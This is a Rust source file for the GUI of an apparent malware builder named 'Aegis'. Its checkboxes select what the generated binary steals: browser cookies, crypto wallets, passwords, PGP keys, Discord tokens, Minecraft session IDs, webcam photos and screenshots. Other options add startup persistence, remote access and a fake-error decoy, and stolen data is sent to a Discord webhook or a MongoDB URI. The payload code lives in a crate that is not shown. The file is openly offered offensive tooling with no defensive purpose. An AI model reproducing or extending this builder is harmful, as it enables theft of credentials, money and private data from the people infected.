use aegis::build_binary;

use iced::{
    Element, Theme, application,
    widget::{button, checkbox, column, container, row, text, text_input},
};

#[derive(Default, Debug, Clone)]
struct App {
    webhook_uri: String,
    browser_cookies: bool,
    crypto_wallets: bool,
    txt_files: bool,
    passwords: bool,
    pgp_keys: bool,
    webcam_photo: bool,
    screenshot_desktop: bool,
    discord_token: bool,
    minecraft_ssid: bool,
    hook_to_startup: bool,
    remote_access: bool,

    mongodb: bool,
    mongodb_uri: String,

    fake_error: bool,
    fe_title: String,
    fe_msg: String,
}

#[derive(Debug, Clone)]
enum Message {
    ChangeWebhookUri(String),
    ToggleBrowserCookies(bool),
    ToggleCryptoWallets(bool),
    ToggleTxtFiles(bool),
    TogglePasswords(bool),
    TogglePgpKeys(bool),
    ToggleWebcamPhoto(bool),
    ToggleScreenshotDesktop(bool),
    ToggleDiscordToken(bool),
    ToggleMinecraftSsid(bool),
    ToggleHookToStartup(bool),
    ToggleRemoteAccess(bool),
    ToggleMongoDB(bool),
    ChangeMongoDBUri(String),

    ToggleFakeError(bool),
    ChangeFakeErrorTitle(String),
    ChangeFakeErrorMsg(String),
    //SendMongo,
    //SendWebhook,
    Build,
}

impl App {
    fn update(&mut self, message: Message) {
        match message {
            Message::ChangeWebhookUri(uri) => {
                self.webhook_uri = uri;
            }
            Message::ToggleBrowserCookies(toggle) => {
                self.browser_cookies = toggle;
            }
            Message::ToggleCryptoWallets(toggle) => {
                self.crypto_wallets = toggle;
            }
            Message::ToggleTxtFiles(toggle) => {
                self.txt_files = toggle;
            }
            Message::TogglePasswords(toggle) => {
                self.passwords = toggle;
            }
            Message::TogglePgpKeys(toggle) => {
                self.pgp_keys = toggle;
            }
            Message::ToggleWebcamPhoto(toggle) => {
                self.webcam_photo = toggle;
            }
            Message::ToggleScreenshotDesktop(toggle) => {
                self.screenshot_desktop = toggle;
            }
            Message::ToggleDiscordToken(toggle) => {
                self.discord_token = toggle;
            }
            Message::ToggleMinecraftSsid(toggle) => {
                self.minecraft_ssid = toggle;
            }
            Message::ToggleHookToStartup(toggle) => {
                self.hook_to_startup = toggle;
            }
            Message::ToggleMongoDB(toggle) => {
                self.mongodb = toggle;
            }
            Message::ChangeMongoDBUri(uri) => {
                self.mongodb_uri = uri;
            }
            Message::ToggleFakeError(toggle) => {
                self.fake_error = toggle;
            }
            Message::ToggleRemoteAccess(toggle) => {
                self.remote_access = toggle;
            }
            Message::ChangeFakeErrorTitle(title) => {
                self.fe_title = title;
            }
            Message::ChangeFakeErrorMsg(msg) => {
                self.fe_msg = msg;
            }
            Message::Build => {
                build_binary(
                    self.screenshot_desktop,
                    self.browser_cookies,
                    self.txt_files,
                    self.discord_token,
                    self.fake_error,
                    self.hook_to_startup,
                    self.remote_access,
                    self.fe_title.as_mut_str(),
                    self.fe_msg.as_mut_str(),
                    self.webhook_uri.clone(),
                );
            }
        }
    }

    fn view(&self) -> Element<Message> {
        let fe: Element<'_, Message> = if self.fake_error {
            column![
                text_input("Fake Error Message", self.fe_msg.as_str())
                    .on_input(Message::ChangeFakeErrorMsg)
                    .width(170.0)
                    .size(12.0),
                text_input("Fake Error Title", self.fe_title.as_str())
                    .on_input(Message::ChangeFakeErrorTitle)
                    .width(170.0)
                    .size(12.0)
            ]
            .into()
        } else {
            text("Fake Error not enabled").size(12.0).into()
        };

        let row = row![
            column![
                checkbox(self.browser_cookies)
                    .label("Browser Cookies")
                    .text_size(12.0)
                    .on_toggle(Message::ToggleBrowserCookies),
                checkbox(self.crypto_wallets)
                    .label("Crypto Wallets")
                    .text_size(12.0)
                    .on_toggle(Message::ToggleCryptoWallets),
                checkbox(self.txt_files)
                    .label("Txt Files")
                    .text_size(12.0)
                    .on_toggle(Message::ToggleTxtFiles),
                checkbox(self.passwords)
                    .label("Passwords")
                    .text_size(12.0)
                    .on_toggle(Message::TogglePasswords),
                checkbox(self.mongodb)
                    .label("MongoDB")
                    .text_size(12.0)
                    .on_toggle(Message::ToggleMongoDB),
                if self.mongodb {
                    text_input("MongoDB URI", self.mongodb_uri.as_str())
                        .on_input(Message::ChangeMongoDBUri)
                        .width(170.0)
                        .size(12.0)
                        .into()
                } else {
                    let e: Element<'_, Message> =
                        text("MongoDB URI is not enabled").size(12.0).into();
                    e
                },
            ]
            .spacing(10.0),
            column![
                checkbox(self.pgp_keys)
                    .label("Pgp Keys")
                    .text_size(12.0)
                    .on_toggle(Message::TogglePgpKeys),
                checkbox(self.webcam_photo)
                    .label("Webcam Photo")
                    .text_size(12.0)
                    .on_toggle(Message::ToggleWebcamPhoto),
                checkbox(self.screenshot_desktop)
                    .label("Screenshot Desktop")
                    .text_size(12.0)
                    .on_toggle(Message::ToggleScreenshotDesktop),
                checkbox(self.discord_token)
                    .label("Discord Token")
                    .text_size(12.0)
                    .on_toggle(Message::ToggleDiscordToken),
                checkbox(self.fake_error)
                    .label("Fake Error")
                    .text_size(12.0)
                    .on_toggle(Message::ToggleFakeError),
                fe
            ]
            .spacing(10.0),
            column![
                checkbox(self.remote_access)
                    .label("Remote Access")
                    .text_size(12.0)
                    .on_toggle(Message::ToggleRemoteAccess),
            ]
            .spacing(10.0),
            column![
                checkbox(self.minecraft_ssid)
                    .label("Minecraft Ssid")
                    .text_size(12.0)
                    .on_toggle(Message::ToggleMinecraftSsid),
                checkbox(self.hook_to_startup)
                    .label("Hook to Startup")
                    .text_size(12.0)
                    .on_toggle(Message::ToggleHookToStartup),
                text_input("Discord Webhook URL", &self.webhook_uri)
                    .on_input(Message::ChangeWebhookUri)
                    .width(200.0)
                    .size(12.0),
                button("Build Aegis").on_press(Message::Build),
            ]
            .spacing(10.0),
        ]
        .padding(20.0)
        .spacing(10.0);

        container(row).into()
    }
}

fn main() -> iced::Result {
    application(|| App::default(), App::update, App::view)
        .window_size((500.0, 300.0))
        .theme(|app: &App| Theme::Oxocarbon)
        .run()
}
